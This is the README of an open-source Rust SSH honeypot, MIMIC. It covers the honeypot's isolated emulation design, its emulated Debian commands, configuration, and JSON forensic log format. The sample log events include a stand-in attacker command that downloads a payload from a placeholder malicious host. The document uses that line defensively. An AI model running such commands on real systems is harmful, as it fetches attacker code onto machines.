# MIMIC — SSH Honeypot

[![CI](https://github.com/Kevin1S1/mimic-ssh-honeypot/actions/workflows/ci.yml/badge.svg)](https://github.com/Kevin1S1/mimic-ssh-honeypot/actions/workflows/ci.yml)
[![License: MIT OR Apache-2.0](https://img.shields.io/badge/license-MIT%20OR%20Apache--2.0-blue)](#license)
[![Rust](https://img.shields.io/badge/rust-1.88%2B-orange)](https://www.rust-lang.org/)
[![unsafe: forbidden](https://img.shields.io/badge/unsafe-forbidden-success)](#security-architecture)

A medium-to-high interaction SSH honeypot written in Rust. MIMIC presents attackers with a fully convincing Debian 12 shell — realistic prompt, MOTD, filesystem, and ~100 emulated commands — while the entire session runs as a **pure in-memory state machine**. No shell process is ever spawned. No real filesystem is ever touched. The Rust compiler statically enforces this through `#![forbid(unsafe_code)]` and strict module-visibility boundaries.

Every attacker action — authentication attempts, commands, `wget`/`curl` downloads, and SCP/SFTP uploads — is captured as a structured JSON event, ready for SIEM ingestion or offline analysis.

---

## Why MIMIC?

Most SSH honeypots either wrap a real shell (introducing real execution risk) or present such a thin emulation that automated scanners identify them immediately. MIMIC takes a different approach:

- **No execution surface.** The emulation layers have zero access to `std::process` or real `std::fs`. Enforced at the Rust module level — there is no code path that can run a real OS command, regardless of what an attacker types.
- **Compiler-enforced memory safety.** `#![forbid(unsafe_code)]` project-wide. Rust's ownership model eliminates buffer overflows, use-after-free, and memory corruption by construction — not by convention.
- **OpenSSH-grade realism.** Banner string, KEX negotiation order, cipher/MAC suite, host key types, coreutils error messages, `/proc` content, and `Last login` line are all modelled on Debian 12 OpenSSH 9.2 — the exact details probed by automated honeypot-detection scanners.
- **Real interactive shell feel.** A full readline-style line editor: arrow-key cursor movement, command history (↑/↓), `Ctrl-R` reverse search, kill/yank keys (`Ctrl-U`/`K`/`W`/`Y`), `Ctrl-A`/`E`/`L`, and Tab completion of commands and filesystem paths. `Ctrl-D` on an empty line logs out like a real login shell, as does the client closing its end of the connection. A shell that can't do these is an easy tell.
- **Calibrated response timing.** Small randomised jitter on command and authentication responses, so perfectly uniform latency — a passive honeypot signal — is avoided.
- **Stable host key fingerprint.** Ed25519 + RSA keys are generated once and persisted across restarts. A rotating fingerprint is a classic honeypot tell; MIMIC avoids it.
- **Structured forensic logging.** Every event is a JSON line on stdout, and optionally mirrored to a daily-rotated file for log shippers. Pipe directly to your SIEM, Elastic stack, or `jq` for ad-hoc analysis.
- **Minimal footprint.** Single Rust binary, <50 MB RAM, distroless Docker image <20 MB, `cap_drop: ALL`, read-only root filesystem.

---

## Architecture

MIMIC is split into five strictly isolated layers. Only the Network layer is allowed to perform real I/O; everything below it operates entirely on in-memory state.

```
┌──────────────────────────────────────────┐
│  1. Network Layer (TCP/SSH)              │  tokio TCP listener, accept-time
│     src/network/                         │  rate limiting, russh handshake
├──────────────────────────────────────────┤
│  2. SSH Protocol Engine                  │  KEX, auth capture, PTY / exec /
│     src/network/ssh.rs                   │  SCP / SFTP channel routing
├──────────────────────────────────────────┤
│  3. Shell Emulator (State Machine)       │  Line editing, pipes, env vars,
│     src/shell/                           │  $PS1, $?, $$, quoting, exit
├──────────────────────────────────────────┤
│  4. Virtual Filesystem (VFS)             │  In-memory inode tree, path
│     src/vfs/                             │  resolution, symlinks, /proc
├──────────────────────────────────────────┤
│  5. Command Registry                     │  ~100 emulated commands — each is
│     src/commands/                        │  a pure Rust function, no OS calls
└──────────────────────────────────────────┘
         ║                      ║
    ┌────╨────┐            ┌────╨────┐
    │ Logging │            │ Config  │
    │  (JSON) │            │ (TOML)  │
    └─────────┘            └─────────┘
```

### Security invariant

The emulation layers (3–5) have **zero access to the real OS**. Enforced by module visibility — only `src/network/` imports `std::fs` and `std::process`, and only for permitted operations (persisting host keys, writing quarantined uploads). The virtual filesystem is an entirely separate in-memory data structure. A build-time test (`tests/escape_vectors.rs`) fails the build if a forbidden API leaks into the emulation layers.

### Connection limiting

Limits are enforced at TCP **accept time** — before the SSH handshake — so a connection flood doesn't allocate any crypto state. Two caps are configurable: a global concurrent session cap (`max_sessions`) and a per-source-IP cap (`per_ip_connections`). The shipped 32-session limit is simultaneous, not a daily traffic quota, and is paired with the deployment's 1 GiB memory ceiling. Raise both together if a larger host needs more concurrency. Rejected connections are logged as `connection_rejected` events.

### Host key persistence

Both an Ed25519 and an RSA host key are generated on first run and written to `host_key_dir`. Subsequent starts load the same keys, so the server fingerprint never changes — a rotating fingerprint is a classic honeypot tell.

---

## Emulated Environment

### Filesystem

A Debian 12 filesystem snapshot is loaded at startup into the in-memory VFS:

| Path | Content |
|---|---|
| `/etc/os-release` | Debian 12 Bookworm |
| `/etc/passwd`, `/etc/group` | Realistic user/group database |
| `/etc/hostname`, `/etc/hosts` | Tracks the configured `hostname` |
| `/proc/cpuinfo` | Single-core Intel Xeon (fake) |
| `/proc/meminfo` | 2 GB RAM (fake), matching `free`, `df` and `top` |
| `/proc/version`, `/proc/uptime`, `/proc/loadavg` | Realistic kernel / load |
| `/var/log/`, `/usr/bin/`, `/home/`, `/root/` | Standard Debian layout |
| `/tmp/` | Writable scratch space |

Home directories for non-root attackers are created automatically under `/home/<username>`.

`/usr/bin` and `/usr/sbin` list 400 real Debian 12 binary names, sourced from
package filelists, matching `dpkg -l`. Most are listed for realism only — see
"Emulated Commands" below for what actually runs. Running a listed-but-not-
emulated name exits 0 with no output, the same outcome a real kernel gives an
empty-but-executable file (`ENOEXEC` falls back to `/bin/sh`, and an empty
script does nothing); an unlisted name still gets `command not found`.

### Emulated Commands

| Category | Commands |
|---|---|
| **Navigation** | `ls` (`-a`/`-A`/`-d`/`-l`/`-h`/`-1`), `cd` (`~`/`-`/`..`), `pwd` |
| **File ops** | `cat`, `touch`, `mkdir` (`-p`), `rm` (`-r`/`-f`), `rmdir`, `cp` (`-r`), `mv`, `chmod` (octal + symbolic), `chown`/`chgrp` (`-R`, root-only), `ln` (`-s`/`-f`), `tar` (`-c`/`-x`/`-t`/`-v`, dashless bundled flags) |
| **Text** | `echo` (`-n`/`-e`), `printf`, `grep` (`-i`/`-v`/`-n`/`-c`/`-r`/`-q`/`-l`/`-w`/`-o`/`-s`/`-h`/`-H`/`-e`, with `-E`/`-F`/`-G`/`-P` accepted; literal substring match), `find` (`-name`/`-type`, glob `-name`), `head`/`tail` (`-n`/`-c`/`-N`), `wc` (`-l`/`-w`/`-c`), `stat` (`-c FORMAT`/`-t`), `du` (`-s`/`-h`/`-a`/`-k`/`-m`/`--max-depth`) |
| **Text plumbing** | `sed` (`s///`, `d`, `p`, any delimiter, literal patterns), `cut` (`-d`/`-f`/`-c`), `tr` (`-d`/`-s`, ranges, POSIX classes), `sort` (`-r`/`-n`/`-u`), `uniq` (`-c`/`-d`/`-u`), `xargs` (`-n`), `tee` (`-a`), `rev`, `nl`, `seq`, `basename`, `dirname`, `base64` (`-d`/`-w0`), `md5sum`, `sha1sum`, `sha256sum`, `sha512sum`, `awk`/`mawk` (`-F`/`-v`/`-f`; `[pattern] {print …}` rules — see below) |
| **Accounts** | `passwd` (prompts twice, echo suppressed), `chpasswd`, `useradd`/`adduser` (`-m`/`-s`/`-u`), `userdel`/`deluser`, `groupadd`/`addgroup`, `getent` (`passwd`/`group`/`shadow`/`hosts`) |
| **Services** | `systemctl` (`status`/`is-active`/`is-enabled`/`list-units`/`start`/`stop`/`enable`/`disable`/`daemon-reload`), `service`, `nohup`, `chattr`, `lsattr`, `sleep`, `sync`, `nologin` |
| **Identity** | `whoami`, `id`, `groups`, `uname` (`-a`/`-s`/`-n`/`-r`/`-v`/`-m`/`-o`), `arch`, `hostname`, `nproc`, `lscpu`, `lsb_release` (`-a`/`-s`/`-i`/`-d`/`-r`/`-c`), `tty`, `date` (`+FORMAT`) |
| **Privilege** | `sudo` (transient elevation for one command; `-i`/`-s` hand over a root shell for the session), `su` (identity switch; prompts a non-root user for a password) |
| **Shells** | `bash`/`sh` (`-c LINE`, a script operand read from the VFS, or piped stdin — each line runs through the same shell that would have run it interactively), `scp` (local copy; remote operands fail as unreachable) |
| **Environment** | `env`, `export`, `unset`, `clear` |
| **Processes** | `ps` (`aux`/`-ef`), `top` (holds the screen and repaints until `q`; `-b`/`-n` dump once), `kill`, `pkill`, `killall`, `pidof`, `pgrep` (`-l`), `free`, `uptime` |
| **Networking** | `wget`, `curl`, `ping`, `netstat`, `ss`, `ip`, `nc`/`netcat` |
| **Interpreters** | `python3`, `perl` — invocation only; nothing is ever interpreted (see below) |
| **Recon** | `history`, `which`, `w`, `last`, `df` (`-h`), `mount`, `crontab` (`-l`), `dmesg` (root-only, `dmesg_restrict`) |
| **Packages** | `apt`, `apt-get`, `dpkg` (stubs — install requires root, fake package DB) |
| **Shell built-ins** | `exit` (`[N]`), `logout` (`[N]`), `true`, `false`, `cd`, `export`, `unset` |
| **Line syntax** | `;`, `&&`, `||` chaining, `|` pipelines, and `>`/`>>`/`2>`/`&>`/`2>&1` output redirection (all quoting-aware), `#` comments, `$VAR`/`${VAR}`/`$?`/`$$`/`$#`/`$0` expansion, `$(…)`/`` `…` `` command substitution and `$((…))` integer arithmetic, here-documents (`<<`, `<<-`, quoted delimiters), single/double quotes, backslash escapes |

A session behaves according to whether it asked for a terminal. With a PTY it is an interactive login shell: prompt, readline editing, and `logout` on the way out. Without one (`ssh -T host < script`, or a one-shot `ssh host cmd`) it is non-interactive, exactly as bash is when it finds a pipe on stdin — no prompt, no echo, no erase sequences, and no `logout` — while the MOTD, which comes from the PAM session rather than the terminal, arrives either way.

Commands write to stdout and stderr separately, as real ones do: a pipeline carries only stdout onward, `$(…)` captures only stdout, `2>` catches only stderr, and an `exec` channel without a PTY sends stderr as `SSH_EXTENDED_DATA_STDERR` so `ssh host nosuchcmd 2>/dev/null` is silent. A channel that asked for a PTY gets the two merged onto the terminal, because a real one has a single stream.

`wget`, `curl`, `nc` and a `python3`/`perl` one-liner that reaches for the network all log a `download` capture event naming the remote endpoint, so one query recovers every host a session tried to contact; `wget` and `curl` additionally write a placeholder file into the VFS.

**The interpreters run nothing.** `python3 -c` and `perl -e` are emulated at the *invocation*: the payload is already captured verbatim in the `command` event, which is where the intelligence is, and executing attacker code is the one thing this box exists not to do. A one-liner that opens a socket gets the traceback a failed connect produces — by far the most common real outcome, since the attacker's listener is usually already gone — and anything else exits quietly. Before this existed the same line came back `command not found` while `dpkg -l` listed `python3` as installed, which was a one-command contradiction. `nc` behaves the same way: no socket is opened, and a connect always reports `Connection refused`.

**`awk` covers pipeline plumbing, not programming.** `{print $N}` rules, `-F`/`-v FS`, bare `/pattern/` matches, `$N == "v"` comparisons and `NR`/`NF` — the shapes awk actually takes in an attack script. Anything outside that subset is a **syntax error with `status: 2`**, deliberately: printing nothing would make awk look like it ran and matched nothing, which is a worse lie than an honest refusal, and the non-zero status is the signal for what to implement next. SCP and SFTP uploads are captured to a SHA-256-named quarantine store on the real filesystem. A non-root `su` shows a realistic `Password:` prompt (suppressing echo) and the typed secret is captured as an `auth_attempt` event before the switch — but, like `sudo`, it never actually fails the credential check: the attacker's session already authenticated at login, so refusing privilege escalation would be an inconsistent tell with no forensic upside. Directory listings honour Unix read permissions, so an unprivileged user running `ls /root` gets `Permission denied` just like a real box — and so does `cd /root`, which needs the directory's search bit. `tar` reads and writes real POSIX ustar archives, so `tar czf t.tgz d && tar tzf t.tgz` round-trips inside the VFS; nothing is compressed, since no command in the emulator can tell (`-z`/`-j`/`-J` are accepted and ignored).


### SSH Banner

```
Linux debian 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
...
Last login: Wed Aug 20 11:03:33 2026 from 10.0.0.5
```

The `Last login` timestamp is derived from the fake box's boot time at startup, as are the snapshot's file mtimes and everything `uptime`, `w`, `last` and `ps` report — so `date` can never contradict them.

---

## Quick Start (Docker)

The recommended deployment method is `docker compose`, as it automatically handles volume permission initialization, log rotation, and applies strict security hardening (read-only filesystem, dropped capabilities).

```bash
# Build and run the stack
docker compose up -d

# Stream forensic logs
docker compose logs -f
```

Host port `22` is mapped to the container's `2222`. A named volume at `/data` persists host keys and the quarantine store across container restarts.

The compose stack includes a **daily reset sidecar** that automatically restarts the honeypot and wipes quarantine data once per day at a random time (see [Daily Reset](#daily-reset) below).

> **Tip:** If something is already running on port 22, stop it first:
> `sudo systemctl stop ssh && sudo systemctl disable ssh`

---

## Configuration

All settings are optional — the honeypot runs with safe defaults if no config file is provided.

Pass the config path as the first argument:

```bash
mimic /path/to/mimic.toml
# or via Docker:
docker run ... -v ./deploy/mimic.toml:/etc/mimic/mimic.toml:ro \
  mimic-honeypot:latest /etc/mimic/mimic.toml
```

### Full reference (`deploy/mimic.toml`)

```toml
# Network
listen_addr       = "0.0.0.0"   # bind address
port              = 2222         # port inside the container; map host 22 → 2222
server_id         = "SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3"
hostname          = "debian"     # appears in the shell prompt and uname
sensor_name       = "mimic"      # identifier in every log line (for multi-sensor setups)

# Limits
max_sessions      = 32           # global concurrent connection cap
per_ip_connections = 4           # per-source-IP concurrent cap
idle_timeout_secs = 300          # drop idle sessions after 5 minutes
max_session_secs  = 1800         # absolute per-session lifetime cap

# Capture
quarantine_dir    = "/data/quarantine" # SCP/SFTP uploads land here (SHA-256 named)
max_upload_bytes  = 8388608      # truncate stored files at 8 MiB
host_key_dir      = "/data/host_keys"  # persisted Ed25519 + RSA keys

[logging]
# Optional log file output. Events always go to stdout; when `dir` is set they
# are also written to a daily-rotated file there for log shippers / manual reads.
dir            = "/data/logs"    # omit to keep stdout-only logging
# retention_days = 30            # omit to keep logs forever; set to delete files older than N days

[auth]
# accept_all   – every password succeeds immediately (maximum interaction)
# reject_all   – capture creds only, never grant a shell
# accept_after – succeed on the Nth attempt (mimics "guessing" the password)
# credentials  – only specific username/password pairs succeed
mode         = "accept_after"
accept_after = 2

# credentials = [
#   { username = "root", password = "toor" },
# ]
```

### Authentication modes

| Mode | Behaviour | Best for |
|---|---|---|
| `accept_all` | Every password works on the first try | Maximum attacker interaction, capturing commands |
| `reject_all` | Always rejects — captures creds but never grants a shell | Passive credential harvesting only |
| `accept_after` | Rejects the first N−1 attempts and accepts the Nth (`accept_after = 2` → the second password works). Must be `1..=6`: `0` would silently mean `accept_all`, and the server enforces Debian's `MaxAuthTries 6`, so a larger value disconnects the client before the accepting attempt is reached | Realistic (attackers expect a few tries) |
| `credentials` | Only specific pairs succeed | Targeted studies |

---

## Log Format

All events are JSON lines on stdout — captured natively by Docker and journald. To read logs straight off disk (for a log shipper such as Filebeat/Logstash, or by hand), set a log directory and mimic will additionally write the same lines to a daily-rotated file:

```toml
[logging]
dir            = "/data/logs"   # writes mimic.YYYY-MM-DD.jsonl here
# retention_days = 30           # optional; omit to keep logs forever
```

- The file is named `mimic.<date>.jsonl` and rotates once per day; each day gets its own file, so a shipper can tail `${dir}/mimic.*.jsonl`.
- **Logs are never deleted by default** — every rotated file is kept indefinitely. Set `retention_days = N` to delete rotated files once they are more than `N` days old. Pruning runs at startup and hourly thereafter, and again whenever the appender rotates, so the window holds across restarts and downtime rather than only while the sensor runs every day. Only this appender's own `mimic.<date>.jsonl` files are ever removed — pointing `dir` at a directory holding other data is safe. Removals are logged as a `log_retention_pruned` event.
- Stdout logging stays on regardless, so `docker compose logs -f` / `journalctl -u mimic -f` keep working alongside the files.
- In Docker, point `dir` at a path on the writable `/data` volume (the compose stack pre-creates `/data/logs`); the container's root filesystem is read-only.
- The directory is set to `0700` on Unix at startup: captured passwords are stored in cleartext, so the log files must not be readable by other local users on the host. This matters most for bare-metal/systemd deployments that share the machine with other accounts.

When no `dir` is configured, storage and rotation are delegated to whatever captures stdout:

- **Docker Compose**: the `json-file` driver ([docker-compose.yml](docker-compose.yml)) rotates at 10 MB × 5 files. The underlying files live under Docker's internal storage (`/var/lib/docker/containers/<container-id>/<container-id>-json.log`) — treat that as an implementation detail and use `docker compose logs -f` / `docker logs mimic` instead of reading it directly.
- **systemd**: captured by journald ([deploy/mimic.service](deploy/mimic.service)); view with `journalctl -u mimic -f`, retention governed by your journald config.

Pipe to `jq`, or ship to your SIEM with one of the recipes below.

```jsonc
// New connection
{"timestamp":"…","level":"INFO","fields":{"event":"connection_opened","sensor_name":"mimic","boot_id":"3f9c…","event_kind":"event","event_category":"intrusion_detection","event_dataset":"mimic.ssh","ecs_version":"8.11.0","session_id":42,"peer":"1.2.3.4:54321","src_ip":"1.2.3.4","src_port":54321}}

// Connection refused (over limit)
{"fields":{"event":"connection_rejected","sensor_name":"mimic","boot_id":"3f9c…","peer":"1.2.3.4:54322","src_ip":"1.2.3.4","src_port":54322,"reason":"per_ip_limit"}}

// Credential capture
{"fields":{"event":"auth_attempt","sensor_name":"mimic","boot_id":"3f9c…","session_id":42,"peer":"…","src_ip":"1.2.3.4","src_port":54321,"username":"root","method":"password","password":"hunter2","accepted":true}}

// Public key offered: the fingerprint is a pivotable IOC in a way a sprayed
// password rarely is, since attackers reuse key material across campaigns.
{"fields":{"event":"auth_attempt","sensor_name":"mimic","session_id":42,"username":"root","method":"publickey","fingerprint":"SHA256:6dq…","accepted":false}}

// The client's own SSH implementation — often the single most useful triage
// field for separating commodity botnets from targeted activity.
{"fields":{"event":"client_banner","sensor_name":"mimic","session_id":42,"banner":"SSH-2.0-libssh2_1.9.0"}}

// Command typed by attacker
{"fields":{"event":"command","sensor_name":"mimic","boot_id":"3f9c…","session_id":42,"peer":"…","command":"wget http://evil.sh/payload","source":"exec","status":0}}

// wget/curl download logged
{"fields":{"event":"download","sensor_name":"mimic","session_id":42,"peer":"…","tool":"wget","url":"http://evil.sh/payload","dest":"/tmp/payload"}}

// Subsystem request (e.g. SFTP)
{"fields":{"event":"subsystem_request","sensor_name":"mimic","session_id":42,"peer":"…","subsystem":"sftp","accepted":true}}

// SCP/SFTP upload captured. `sha256` is the complete payload as it came off the
// wire — the hash to look up in an IOC feed. `stored_sha256` is what is on
// disk (and the quarantine filename); the two differ only when `truncated`.
// `stored_path` is the full path under `quarantine_dir`, always written with
// `/` separators so it is the same shape on every host.
{"fields":{"event":"upload","sensor_name":"mimic","session_id":42,"peer":"…","name":"bot.elf","dest":"/tmp/bot.elf","size":98304,"sha256":"a3f…","stored_sha256":"a3f…","stored_path":"/data/quarantine/a3f…","truncated":false}}

// Session ended
{"fields":{"event":"connection_closed","sensor_name":"mimic","boot_id":"3f9c…","session_id":42,"peer":"…","duration_secs":37,"command_count":9}}
```

Parse with jq:
```bash
# Show all captured passwords
docker logs mimic | jq 'select(.fields.event=="auth_attempt") | {ip:.fields.peer, user:.fields.username, pass:.fields.password}'

# List downloaded URLs
docker logs mimic | jq 'select(.fields.event=="download") | .fields.url'
```

### Every event, and what carries it

Sixteen event types share one envelope. `sensor_name`, `boot_id`, `event_kind`,
`event_category`, `event_dataset` and `ecs_version` are on all of them;
everything that happens inside a session also carries `session_id`, `peer`,
`src_ip` and `src_port`.

The last four are the ECS classification fields, emitted by the sensor rather
than bolted on by each operator's shipper — see [Elastic / ECS](#elastic--ecs).

**Level is meant to be routable.** Two events are `WARN` because the attacker
achieved something: a login that worked, and a payload that landed. Failed
logins, commands and connections stay `INFO` — on an internet-facing sensor they
are the background radiation, and raising them would drown the two that matter.
The remaining `WARN`s (`accept_error`, `quarantine_session_cap`,
`quarantine_global_cap`, `quarantine_error`) are the sensor itself degrading. So
`level=WARN` alone is a usable alert filter with no lookup table.

| `event` | Level | Session-scoped | What it means |
|---|---|---|---|
| `listening` | INFO | no | The listener bound. Emitted once per process start. |
| `shutdown` | INFO | no | SIGTERM/SIGINT received; buffered log lines are flushed. |
| `accept_error` | WARN | no | The accept loop failed on one connection. |
| `log_retention_pruned` | INFO | no | The retention sweep deleted rotated log files past `logging.retention_days`. |
| `connection_rejected` | INFO | **no `session_id`** | Refused before a session existed (`per_ip_limit` / `global_limit`). |
| `connection_opened` | INFO | yes | A session was created. |
| `client_banner` | INFO | yes | The client's SSH version string, at first channel open. |
| `auth_attempt` | INFO / **WARN** if `accepted` | yes | A credential was offered. Carries `password` (cleartext) or a public-key `fingerprint`. |
| `command` | INFO | yes | A command line ran. Carries `source` and `status`. |
| `download` | INFO | yes | A remote endpoint was named (`wget`/`curl`/`nc`, or a `python3`/`perl` one-liner). No real request was made. |
| `subsystem_request` | INFO | yes | A subsystem (e.g. SFTP) was requested. |
| `upload` | WARN | yes | An SCP/SFTP payload was captured to the quarantine store. |
| `quarantine_session_cap` | WARN | yes | The session hit its real-disk write cap; the payload is still in the VFS. |
| `quarantine_global_cap` | WARN | yes | The honeypot hit its global quarantine storage cap; the payload is still in the VFS. |
| `quarantine_error` | WARN | yes | **A payload capture failed.** The one to page on when the sensor itself is the problem. |
| `session_timeout` | INFO | yes | *We* cut the session off, rather than the attacker leaving. |
| `connection_closed` | INFO | yes | Session ended. Carries `duration_secs` and `command_count`. |

Two caveats that produce silently wrong dashboards rather than errors:

- **Correlate on `boot_id` + `session_id`, never `session_id` alone.**
  `session_id` restarts at 1 on every process start, and the
  [Daily Reset](#daily-reset) restarts the process every day — so a
  `transaction session_id` spanning a restart merges unrelated sessions into one
  apparent intrusion, with nothing in the data to indicate it happened.
- **`connection_rejected` has no `session_id`.** It precedes session creation, so
  any query that joins on `session_id` silently drops every rate-limited
  connection. If you are measuring flood volume, count these separately.

### `command` events: telling a bot from a human

```jsonc
{"fields":{"event":"command","sensor_name":"mimic","boot_id":"…","session_id":42,
           "peer":"1.2.3.4:54321","src_ip":"1.2.3.4","src_port":54321,
           "command":"wget http://evil.sh/payload","source":"exec","status":0}}
```

- `source` is `interactive` (typed at a PTY), `exec` (`ssh host 'cmd'`), `pipe`
  (a shell channel with no terminal), `heredoc`, `script` (one line of a body
  `sh` ran out of the VFS or off a pipe — the inside of a dropper, never typed
  by the client), or `transfer` (SCP). Anything other than `interactive` is
  close to a bot marker on its own.
- `status` is the exit code, or `-1` when the line is logged before it runs.
  **`status: 127` is the most useful single query a honeypot operator has** — it
  names the commands attackers expected to work that this box does not emulate,
  which is exactly the list worth implementing next.

```bash
# What are attackers reaching for that MIMIC does not have?
jq -r 'select(.fields.event=="command" and .fields.status==127) | .fields.command' \
  mimic.*.jsonl | awk '{print $1}' | sort | uniq -c | sort -rn | head -20

# Sessions that look manual rather than automated
jq -r 'select(.fields.event=="command" and .fields.source=="interactive")
       | .fields.session_id' mimic.*.jsonl | sort -u
```

### Splunk

Every field lands under `fields.*` because that is how `tracing`'s JSON
formatter nests them. Rather than carrying the `fields.` prefix through every
SPL search forever, rename once at index time:

```ini
# props.conf
[mimic:json]
INDEXED_EXTRACTIONS = json
KV_MODE             = none
TIME_PREFIX         = "timestamp":"
TIME_FORMAT         = %Y-%m-%dT%H:%M:%S.%6NZ
MAX_TIMESTAMP_LOOKAHEAD = 32
TRUNCATE            = 0
SHOULD_LINEMERGE    = false
FIELDALIAS-mimic    = fields.src_ip AS src_ip fields.src_port AS src_port \
                      fields.username AS user fields.event AS action \
                      fields.session_id AS session_id fields.boot_id AS boot_id
EVAL-app            = "mimic"
EVAL-vendor_product = "MIMIC SSH Honeypot"
```

```ini
# inputs.conf
[monitor:///data/logs/mimic.*.jsonl]
sourcetype = mimic:json
index      = honeypot
```

The `src_ip`/`user`/`action` aliases are the Splunk CIM Authentication and
Network Traffic names, so `auth_attempt` events drop into CIM-based dashboards
without further mapping.

### Elastic / ECS

`filebeat.yml` — the `peer` string is already split into `src_ip`/`src_port` by
the honeypot and the ECS classification fields are emitted by it too, so this is
pure renaming: no grok, and nothing synthesised in the shipper that could drift
from what the sensor actually is.

```yaml
filebeat.inputs:
  - type: filestream
    id: mimic
    paths: ["/data/logs/mimic.*.jsonl"]
    parsers:
      - ndjson:
          target: ""
          overwrite_keys: true
processors:
  - rename:
      fields:
        - { from: "fields.src_ip",     to: "source.ip" }
        - { from: "fields.src_port",   to: "source.port" }
        - { from: "fields.username",   to: "user.name" }
        - { from: "fields.event",      to: "event.action" }
        - { from: "fields.session_id", to: "event.id" }
        - { from: "fields.event_kind", to: "event.kind" }
        - { from: "fields.event_category", to: "event.category" }
        - { from: "fields.event_dataset", to: "event.dataset" }
        - { from: "fields.ecs_version", to: "ecs.version" }
      ignore_missing: true
```


---

## Build from Source

Requires a [Rust toolchain](https://rustup.rs/) (stable, MSRV 1.88).

```bash
git clone https://github.com/Kevin1S1/mimic-ssh-honeypot.git
cd mimic-ssh-honeypot

# Development build + run (defaults to 0.0.0.0:2222)
cargo run

# With a config file
cargo run -- deploy/mimic.toml

# Release build
cargo build --release
./target/release/mimic deploy/mimic.toml

# Tests
cargo test
```

---

## Systemd (non-Docker)

```bash
# Build and install the binary
cargo build --release
sudo install -m0755 target/release/mimic /usr/local/bin/mimic
sudo install -Dm0644 deploy/mimic.toml /etc/mimic/mimic.toml
sudo install -Dm0644 deploy/mimic.service /etc/systemd/system/mimic.service

# Enable and start
sudo systemctl daemon-reload
sudo systemctl enable --now mimic

# Logs
sudo journalctl -u mimic -f
```

The unit runs under a transient unprivileged user (`DynamicUser=yes`) with a fully sandboxed filesystem and `CAP_NET_BIND_SERVICE` so it can optionally bind port 22 directly.

---

## Daily Reset

MIMIC includes an automatic daily reset that wipes quarantine data and restarts the honeypot so each day begins with a clean slate. The restart time is **randomised** within a configurable window (default: 0–3 hours after midnight UTC) so attackers cannot predict exactly when the service bounces.

### Docker

The `docker-compose.yml` includes a `mimic-reset` sidecar container that handles this automatically — no extra setup needed. Tune it with environment variables:

| Variable | Default | Description |
|---|---|---|
| `MIMIC_RESET_WINDOW` | `10800` | Max random delay in seconds (10800 = 3 h) |
| `MIMIC_CONTAINER` | `mimic` | Name of the honeypot container to restart |
| `MIMIC_DATA_DIR` | `/data` | Path to the data volume (quarantine is wiped under this) |

```yaml
# Example: narrow the window to 1 hour
environment:
  - MIMIC_RESET_WINDOW=3600
```

> **Privilege tradeoff:** the sidecar needs the host's Docker socket to restart the honeypot container. The `:ro` flag makes the socket *file* read-only but does **not** restrict Docker API calls, so that container effectively has root on the host daemon. It is isolated (`network_mode: none`, no attacker input, separate container from the honeypot), but if you would rather not grant it, use the systemd timer below instead — it needs no Docker socket. See [SECURITY.md](SECURITY.md#7-daily-reset-ephemeral-state-hygiene).

### Systemd

Install the timer and one-shot service alongside the main unit:

```bash
sudo install -Dm0755 deploy/daily-reset.sh      /usr/local/lib/mimic/daily-reset.sh
sudo install -Dm0644 deploy/mimic-reset.service /etc/systemd/system/mimic-reset.service
sudo install -Dm0644 deploy/mimic-reset.timer   /etc/systemd/system/mimic-reset.timer
sudo systemctl daemon-reload
sudo systemctl enable --now mimic-reset.timer
```

The timer fires at midnight UTC; the script then sleeps for a random duration within the window before performing the reset.

### What gets wiped

- **Quarantine store** (`quarantine/`) — captured SCP and SFTP uploads are deleted.
- **In-memory state** — the process restart clears all VFS modifications, shell histories, and session state.
- **Host keys are preserved** — the SSH fingerprint stays stable across resets (a changing fingerprint is a honeypot tell).

---

## Project Structure

```
mimic-ssh-honeypot/
├── src/
│   ├── main.rs              Entry point, config loading
│   ├── config.rs            TOML config parsing + validation
│   ├── lib.rs               Public crate root
│   ├── network/
│   │   ├── mod.rs           TCP listener, accept loop, rate limiting
│   │   ├── ssh.rs           SSH protocol engine (russh), channel routing
│   │   ├── limiter.rs       Connection registry (global + per-IP caps, RAII guards)
│   │   ├── scp.rs           SCP sink — upload capture protocol
│   │   ├── sftp.rs          SFTP subsystem (v3) — upload capture & VFS operations
│   │   └── hostkey.rs       Persistent Ed25519 + RSA host keys
│   ├── shell/
│   │   ├── mod.rs           Shell state machine, expansion, dispatch, history
│   │   ├── line.rs          Readline-style line editor (cursor, history, Ctrl-R)
│   │   ├── complete.rs      Tab completion (command names + VFS paths)
│   │   ├── arith.rs         Integer arithmetic for $((…))
│   │   ├── parser.rs        Tokenizer (quoting, separators, pipes, redirects)
│   │   └── env.rs           Environment variables, $PS1
│   ├── vfs/
│   │   ├── mod.rs           Virtual filesystem tree (arena-based)
│   │   ├── nodes.rs         File / directory / symlink node types
│   │   └── snapshot.rs      Debian 12 filesystem snapshot
│   ├── commands/
│   │   ├── mod.rs           Command registry and dispatcher
│   │   ├── fs.rs            ls, cat, cd, pwd, touch, rm, mkdir, cp, mv, chmod
│   │   ├── system.rs        uname, whoami, id, ps, top, kill, df, history, recon
│   │   ├── net.rs           wget, curl, ping, netstat, ss, ip
│   │   └── pkg.rs           apt, apt-get, dpkg stubs
│   └── logging/
│       ├── mod.rs           JSON logging initialisation (tracing)
│       └── event.rs         Typed forensic event helpers
├── tests/
│   ├── escape_vectors.rs    Asserts emulation layers contain no real-OS I/O
│   └── output_truncation.rs Verifies the per-command output cap holds under load
├── deploy/
│   ├── mimic.toml           Example / reference configuration
│   ├── mimic.service        Systemd unit (honeypot service)
│   ├── mimic-reset.service  Systemd unit (daily reset one-shot)
│   ├── mimic-reset.timer    Systemd timer (fires the daily reset)
│   └── daily-reset.sh       Reset script (wipe + restart with random jitter)
├── Dockerfile               Multi-stage: rust:1.88 → distroless/cc-debian12:nonroot
├── docker-compose.yml       Production-ready compose stack
└── .dockerignore
```

---

## Security Architecture

The full threat model, attack-surface matrix, security invariants, and vulnerability-reporting process are documented in [SECURITY.md](SECURITY.md).

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for the two conventions that are
load-bearing here — the build-enforced module boundary and the `// ponytail:`
marker for deliberate emulation shortcuts.

Pull requests are welcome. Before submitting, run local quality checks:

```bash
cargo fmt --all -- --check
cargo test --workspace --all-targets
cargo clippy --workspace --all-targets --all-features -- -D warnings
```

---

## Disclaimer

